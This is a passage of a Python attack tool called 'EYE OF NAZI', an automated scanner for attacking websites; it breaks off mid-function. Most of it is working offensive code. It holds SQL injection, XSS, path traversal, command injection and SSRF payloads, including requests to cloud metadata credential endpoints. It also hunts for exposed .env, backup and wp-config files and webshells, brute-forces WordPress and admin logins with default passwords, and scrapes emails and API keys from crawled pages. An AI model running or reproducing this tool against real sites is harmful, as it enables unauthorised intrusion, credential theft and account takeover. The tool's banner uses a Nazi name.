#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v48.0 - DANGER EDITION
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json, socket, base64
import urllib.parse, urllib.request, urllib.error
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              DANGER EDITION v48.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

PAYLOADS = {
    'sqli': ["'", "\"", "'--", "1' OR '1'='1", "1' OR 1=1--",
             "1' AND 1=1--", "1' AND 1=2--", "admin'--",
             "' UNION SELECT NULL--", "1' ORDER BY 100--",
             "1' AND SLEEP(3)--"],
    'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>"],
    'lfi': ["../../../../../../etc/passwd", "../../../../../../etc/hosts",
            "../../../../../../windows/win.ini", "/etc/passwd",
            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
    'rce': [";id", "|id", "&&id", "$(id)", ";whoami", "|whoami",
            ";uname -a", ";ls -la"],
    'ssrf': ["http://127.0.0.1", "http://localhost",
             "http://169.254.169.254/latest/meta-data/",
             "file:///etc/passwd", "http://[::1]"],
    'redir': ["http://evil.com", "//evil.com", "///evil.com"],
    'crlf': ["%0d%0aInjected-Header:yes", "%0aInjected-Header:yes"],
}

SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
              'blog', 'shop', 'forum', 'cdn', 'static', 'app',
              'portal', 'vpn', 'git', 'webmail', 'secure', 'login']

PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
         1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017, 9200]

HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'HEAD', 'TRACE']

SQL_ERR = ["sql syntax", "warning: mysql", "unclosed quotation",
           "quoted string not properly terminated", "odbc sql server",
           "sqlite3.operationalerror", "postgresql", "mariadb", "sqlstate"]

LFI_IND = ["root:x:0:0", "daemon:x:", "www-data:", "[extensions]"]
RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]
SSRF_IND = ["root:x:0:0", "ami-id", "meta-data", "redis_version"]

SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
            'X-Content-Type-Options', 'Content-Security-Policy']

PATHS = [
    '.env', '.env.local', '.env.production',
    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
    'config.php.bak', 'config.json', '.htaccess', '.htpasswd',
    'web.config', '.git/config', '.git/HEAD',
    'backup.zip', 'backup.tar.gz', 'backup.sql', 'www.zip',
    'db.sql', 'database.sql', 'dump.sql',
    'admin', 'admin/', 'admin.php', 'administrator', 'admin/login',
    'wp-admin/', 'wp-login.php', 'phpmyadmin', 'pma', 'cpanel', 'webmail',
    'phpinfo.php', 'info.php', 'test.php', 'server-status',
    'robots.txt', 'sitemap.xml', 'security.txt',
    'error.log', 'access.log', 'logs/',
    'wp-json/', 'wp-json/wp/v2/users', 'xmlrpc.php', 'readme.html',
    'api/', 'api/v1/', 'api/v2/', 'rest/', 'graphql', 'swagger.json',
    'uploads/', 'files/', 'downloads/', 'tmp/',
    'install/', 'setup/', 'db.php', 'database.php',
    'README.md', 'package.json', 'composer.json', 'Dockerfile',
]

BACKUP_FILES = [
    'backup.zip', 'backup.tar.gz', 'backup.sql', 'www.zip',
    'site.zip', 'db.sql', 'database.sql', 'dump.sql',
    'backup-2024.zip', 'old.zip', 'site_backup.zip',
]

ADMIN_PATHS = [
    'admin', 'admin/', 'admin.php', 'admin/login', 'admin/login.php',
    'admin/index.php', 'administrator', 'administrator.php',
    'wp-admin/', 'wp-login.php', 'wp-admin/install.php',
    'phpmyadmin', 'phpMyAdmin', 'pma', 'mysql', 'adminer.php',
    'cpanel', 'webmail', 'plesk', 'directadmin',
    'panel', 'dashboard', 'console', 'backend', 'cms',
    'login', 'login.php', 'signin', 'auth',
]

API_ENDPOINTS = [
    'api', 'api/', 'api/v1', 'api/v1/', 'api/v2', 'api/v2/',
    'api/v3', 'api/v3/', 'api/v4', 'api/v4/',
    'api/users', 'api/user', 'api/admin', 'api/login',
    'api/auth', 'api/config', 'api/status', 'api/health',
    'api/version', 'api/info', 'api/data', 'api/list',
    'api/search', 'api/upload', 'api/download', 'api/file',
    'api/me', 'api/profile', 'api/account', 'api/settings',
    'rest', 'rest/', 'rest/api', 'rest/v1', 'rest/v1/',
    'rest/v2', 'rest/users', 'rest/admin',
    'graphql', 'graphiql', 'graphql.php',
    'swagger', 'swagger.json', 'swagger.yaml',
    'openapi.json', 'openapi.yaml', 'api-docs',
    'docs', 'docs/', 'documentation',
    'json', 'json/', 'xml', 'xml/', 'rss', 'rss/', 'atom',
]

SHELL_FILES = [
    'shell.php', 'cmd.php', 'c99.php', 'r57.php', 'b374k.php',
    'webshell.php', 'backdoor.php', 'hack.php', 'upload.php',
    'test.php', 'tmp.php', 'x.php', '1.php', 'a.php',
    '.shell.php', 'shell.phtml', 'shell.php5', 'shell.php7',
]

BRUTE_PASSWORDS = [
    'admin', 'password', '123456', 'admin123', 'root',
    'password123', 'admin@123', 'admin1', 'administrator',
    'qwerty', 'letmein', 'welcome', 'changeme', 'test',
    'test123', 'demo', 'demo123', 'user', 'guest',
]

JWT_TOKENS = [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
]

GRAPHQL_QUERIES = [
    "{__schema{types{name}}}",
    "{__schema{queryType{name}}}",
    "query{__typename}",
    "{__type(name:\"User\"){name,fields{name}}}",
]

SECRET_PATTERNS = [
    r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
    r'secret["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
    r'AKIA[0-9A-Z]{16}',
    r'sk_live_[0-9a-zA-Z]{24,}',
    r'ghp_[0-9a-zA-Z]{36}',
    r'AIza[0-9A-Za-z\-_]{35}',
]

CLOUD_METADATA = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',
]

KNOWN_CVES = {
    'WordPress': {'5.0': ['CVE-2019-8942'], '5.4': ['CVE-2020-4046'],
                  '5.6': ['CVE-2021-29447'], '6.0': ['CVE-2022-21661']},
    'Drupal': {'7': ['CVE-2018-7600'], '8': ['CVE-2019-6340']},
    'Joomla': {'3': ['CVE-2015-8562']},
    'Magento': {'2': ['CVE-2022-24086']},
    'Laravel': {'8': ['CVE-2021-3129']},
}


class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url, data=None, method=None, headers=None):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        if headers:
            hdrs.update(headers)
        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 'h': dict(rp.headers),
                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
                    'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
                    'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 'h': {}, 't': '', 'n': 0,
                    'dt': time.time() - t0, 'err': str(e)}


class Scan:
    def __init__(self, url, cl, threads=30):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.f = []
        self.nt = 0
        self.np = 0
        self.npath = 0
        self.techs = []
        self.waf = []
        self.crawled = set()
        self.emails = set()
        self.secrets = []
        self.cves = []
        self.shells = []
        self.creds = []

    def add(self, u, p, t, pl, ev, sev):
        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
                       'evidence': ev[:200] if ev else '', 'severity': sev})
        icons = {'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
                 'XSS': '\033[43m[XSS]\033[0m',
                 'LFI': '\033[95m[LFI]\033[0m',
                 'RCE': '\033[41m\033[97m[RCE]\033[0m',
                 'SSRF': '\033[94m[SSRF]\033[0m',
                 'REDIR': '\033[96m[REDIR]\033[0m',
                 'CRLF': '\033[93m[CRLF]\033[0m',
                 'HEADER': '\033[2m[HDR]\033[0m',
                 'PATH': '\033[92m[PATH]\033[0m',
                 'PORT': '\033[93m[PORT]\033[0m',
                 'SUB': '\033[94m[SUB]\033[0m',
                 'SSL': '\033[95m[SSL]\033[0m',
                 'HTTP': '\033[96m[HTTP]\033[0m',
                 'CVE': '\033[41m\033[97m[CVE]\033[0m',
                 'SECRET': '\033[41m\033[97m[SEC]\033[0m',
                 'EMAIL': '\033[94m[MAIL]\033[0m',
                 'ADMIN': '\033[92m[ADMIN]\033[0m',
                 'API': '\033[96m[API]\033[0m',
                 'SHELL': '\033[41m\033[97m[SHELL]\033[0m',
                 'JWT': '\033[43m[JWT]\033[0m',
                 'GRAPHQL': '\033[95m[GQL]\033[0m',
                 'CORS': '\033[95m[CORS]\033[0m',
                 'CLOUD': '\033[41m\033[97m[CLOUD]\033[0m',
                 'BRUTE': '\033[43m[BRUTE]\033[0m'}
        icon = icons.get(t, '[' + t + ']')
        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
        print("    URL    : " + u[:120])
        if p:
            print("    Param  : \033[93m" + p + "\033[0m")
        if pl:
            print("    Payload: " + pl[:80])
        if ev:
            print("    Proof  : " + ev[:200])

    def inject(self, url, p, pl):
        pr = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        qs[p] = [pl]
        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path,
                                         pr.params,
                                         urllib.parse.urlencode(qs, doseq=True),
                                         pr.fragment))

    def params(self, url):
        q = urllib.parse.urlparse(url).query
        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()) if q else []

    def scan_url(self, url):
        for p in self.params(url):
            self.np += 1
            print("  \033[2m->\033[0m \033[93m" + p + "\033[0m @ " + url[:65])
            base = self.cl.req(url)
            b = base['t'] if not base['err'] else ''
            for pl in PAYLOADS['sqli']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for err in SQL_ERR:
                    if err in r['t'].lower():
                        self.add(url, p, 'SQLI', pl, "DB err: " + err, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break
            for pl in PAYLOADS['xss']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                if pl in r['t']:
                    self.add(url, p, 'XSS', pl, "Reflected", "HIGH")
                    break
            for pl in PAYLOADS['lfi']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for ind in LFI_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'LFI', pl, "Leak: " + ind, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break
            for pl in PAYLOADS['rce']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for ind in RCE_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'RCE', pl, "Output: " + ind, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break
            for pl in PAYLOADS['ssrf']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for ind in SSRF_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'SSRF', pl, "Leak: " + ind, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break

    def check_headers(self, url):
        r = self.cl.req(url)
        if r['err']:
            return
        missing = [h for h in SEC_HDRS
                   if not any(h.lower() == k.lower() for k in r['h'])]
        if missing:
            self.add(url, '', 'HEADER', '', "Missing: " + ", ".join(missing), "LOW")

    def fingerprint(self, url):
        r = self.cl.req(url)
        if r['err']:
            return []
        det = set()
        text_low = r['t'].lower()
        hdr_str = str(r['h']).lower()
        techs = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Drupal': ['drupal'],
            'Joomla': ['joomla'],
            'Magento': ['magento'],
            'Laravel': ['laravel_session'],
            'Django': ['csrftoken'],
            'PHP': ['PHPSESSID'],
            'nginx': ['nginx'],
            'Apache': ['Apache'],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'React': ['react'],
            'jQuery': ['jquery'],
            'LiteSpeed': ['litespeed'],
        }
        for tech, signs in techs.items():
            for s in signs:
                if s.lower() in text_low or s.lower() in hdr_str:
                    det.add(tech)
                    break
        return sorted(det)

    def detect_waf(self, url):
        test_url = url.rstrip('/') + '/?x=' + urllib.parse.quote("' OR 1=1--<script>alert(1)</script>")
        r = self.cl.req(test_url)
        if r['err']:
            return []
        h_low = str(r['h']).lower()
        b_low = r['t'].lower()
        det = []
        wafs = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid'],
            'Sucuri': ['x-sucuri-id'],
            'ModSecurity': ['mod_security'],
            'Wordfence': ['wordfence'],
            'Akamai': ['akamai'],
        }
        for waf, signs in wafs.items():
            for s in signs:
                if s in h_low or s in b_low:
                    det.append(waf)
                    break
        return det

    def check_path(self, base, path):
        url = base.rstrip('/') + '/' + path.lstrip('/')
        r = self.cl.req(url)
        if r['err']:
            return None
        if r['s'] in (200, 301, 302, 401, 403):
            return {'url': url, 's': r['s'], 'n': r['n'], 'path': path}
        return None

    def scan_paths(self, base):
        print("\n\033[96m[*]\033[0m Scanning " + str(len(PATHS)) + " paths...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self.check_path, base, p): p for p in PATHS}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res:
                        self.npath += 1
                        if res['s'] == 200:
                            sev = "MEDIUM"
                            for x in ['.env', '.git', 'backup', 'wp-config', 'sql']:
                                if x in res['path']:
                                    sev = "HIGH"
                                    break
                            self.add(res['url'], '', 'PATH', '',
                                     "Status " + str(res['s']) + " - " + str(res['n']) + "B", sev)
                        elif res['s'] in (401, 403):
                            self.add(res['url'], '', 'PATH', '',
                                     "Protected (" + str(res['s']) + ")", "INFO")
                except Exception:
                    pass

    def find_admin(self, base):
        print("\n\033[96m[*]\033[0m Admin Finder (" + str(len(ADMIN_PATHS)) + ")...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self.check_path, base, p): p for p in ADMIN_PATHS}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res and res['s'] in (200, 401, 403):
                        sev = "HIGH" if res['s'] == 200 else "MEDIUM"
                        self.add(res['url'], '', 'ADMIN', '',
                                 "Admin (" + str(res['s']) + ")", sev)
                except Exception:
                    pass

    def fuzz_api(self, base):
        print("\n\033[96m[*]\033[0m API Fuzzing (" + str(len(API_ENDPOINTS)) + ")...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self.check_path, base, p): p for p in API_ENDPOINTS}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res and res['s'] in (200, 401, 403):
                        self.add(res['url'], '', 'API', '',
                                 "API (" + str(res['s']) + ")", "MEDIUM")
                except Exception:
                    pass

    def detect_shell(self, base):
        print("\n\033[96m[*]\033[0m Shell Detector (" + str(len(SHELL_FILES)) + ")...")
        for sf in SHELL_FILES:
            url = base.rstrip('/') + '/' + sf
            r = self.cl.req(url)
            if not r['err'] and r['s'] == 200:
                if any(x in r['t'].lower() for x in ['cmd', 'exec', 'system', 'shell_exec', 'passthru']):
                    self.shells.append(url)
                    self.add(url, '', 'SHELL', '', "Shell detected!", "CRITICAL")

    def cloud_metadata(self, url):
        print("\n\033[96m[*]\033[0m Cloud Metadata...")
        for p in self.params(url):
            for mu in CLOUD_METADATA:
                r = self.cl.req(self.inject(url, p, mu))
                if r['err']:
                    continue
                for ind in ['ami-id', 'instance-id', 'access_key', 'secret_key', 'computeMetadata']:
                    if ind in r['t']:
                        self.add(url, p, 'CLOUD', mu, "Cloud metadata: " + ind, "CRITICAL")
                        break

    def check_cors(self, url):
        print("\n\033[96m[*]\033[0m CORS Misconfiguration...")
        for origin in ['https://evil.com', 'null']:
            r = self.cl.req(url, headers={'Origin': origin})
            if r['err']:
                continue
            acao = r['h'].get('Access-Control-Allow-Origin', '') or r['h'].get('access-control-allow-origin', '')
            acac = r['h'].get('Access-Control-Allow-Credentials', '') or r['h'].get('access-control-allow-credentials', '')
            if acao == origin or acao == '*':
                sev = "HIGH" if acac.lower() == 'true' else "MEDIUM"
                self.add(url, '', 'CORS', origin, "ACAO: " + acao + " ACAC: " + acac, sev)
                break

    def check_jwt(self, url):
        print("\n\033[96m[*]\033[0m JWT Analysis...")
        r = self.cl.req(url)
        if r['err']:
            return
        cookies = r['h'].get('Set-Cookie', '') or r['h'].get('set-cookie', '')
        tokens = re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', r['t'] + ' ' + cookies)
        for tok in tokens[:3]:
            try:
                header = base64.urlsafe_b64decode(tok.split('.')[0] + '==').decode('utf-8', 'ignore')
                if '"alg":"none"' in header.replace(' ', ''):
                    self.add(url, '', 'JWT', tok[:50], "alg:none vulnerability", "CRITICAL")
                else:
                    print("  \033[92m[+]\033[0m JWT: " + header[:80])
            except Exception:
                pass

    def check_graphql(self, url):
        print("\n\033[96m[*]\033[0m GraphQL Introspection...")
        for path in ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']:
            gql = url.rstrip('/') + path
            try:
                data = GRAPHQL_QUERIES[0].encode()
                r = self.cl.req(gql, data=data, headers={'Content-Type': 'application/json'})
                if not r['err'] and r['s'] == 200 and '__schema' in r['t']:
                    self.add(gql, '', 'GRAPHQL', '', "Introspection enabled", "HIGH")
                    break
            except Exception:
                pass

    def brute_login(self, url):
        print("\n\033[96m[*]\033[0m Login Brute Force...")
        base = url.rstrip('/')
        for lp in ['wp-login.php', 'admin/login.php', 'admin/login', 'login.php']:
            login_url = base + '/' + lp
            r = self.cl.req(login_url)
            if r['err'] or r['s'] not in (200, 401, 403):
                continue
            print("  \033[92m[+]\033[0m Login page: " + login_url)
            for pwd in BRUTE_PASSWORDS[:5]:
                for usr in ['admin', 'administrator', 'root']:
                    try:
                        data = urllib.parse.urlencode({'log': usr, 'pwd': pwd, 'wp-submit': 'Log In'}).encode()
                        r2 = self.cl.req(login_url, data=data, method='POST')
                        if not r2['err'] and (r2['s'] == 302 or 'wordpress_logged_in' in str(r2['h']).lower()):
                            cred = usr + ":" + pwd
                            self.creds.append(cred)
                            self.add(login_url, '', 'BRUTE', cred, "Login successful!", "CRITICAL")
                            break
                    except Exception:
                        pass

    def crawl(self, url, depth=1):
        print("\n\033[96m[*]\033[0m Crawling (depth=" + str(depth) + ")...")
        to_visit = [(url, 0)]
        while to_visit:
            cur, d = to_visit.pop(0)
            if cur in self.crawled or d > depth:
                continue
            self.crawled.add(cur)
            r = self.cl.req(cur)
            if r['err'] or not r['t']:
                continue
            if '?' in cur:
                self.scan_url(cur)
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r['t'])
            for email in emails:
                email = email.lower()
                if email not in self.emails and 'example' not in email:
                    self.emails.add(email)
                    self.add(cur, '', 'EMAIL', '', "Email: " + email, "INFO")
            for pat in SECRET_PATTERNS:
                for m in re.finditer(pat, r['t'], re.IGNORECASE):
                    found = m.group(0)[:80]
                    if found not in self.secrets:
                        self.secrets.append(found)
                        self.add(cur, '', 'SECRET', '', "Secret: " + found, "HIGH")
            if d < depth:
                links = re.findall(r'href=["\']([^"\']+)["\']', r['t'], re.IGNORECASE)
                for lk in links:
                    if lk.startswith(('javascript:', '#', 'mailto:')):
                        continue
                    full = urllib.parse.urljoin(cur, lk)
                    try:
                        host = urllib.parse.urlparse(self.url).netloc
                        if host in full and full not in self.crawled:
                            to_visit.append((full, d + 1))
                    except Exception:
                        pass
        print("  \033[92m[+]\033[0m Crawled " + str(len(self.crawled)) + " URLs")

    def enum_subdomains(self, domain):
        print("\n\033[96m[*]\033[0m Subdomain Enumeration...")
        found = []

        def check(sub):
            url = "http://" + sub + "." + domain
            r = self.cl.req(url)
            if not r['err'] and r['s'] in (200, 301, 302, 401, 403):
                return {'url': url, 's': r['s']
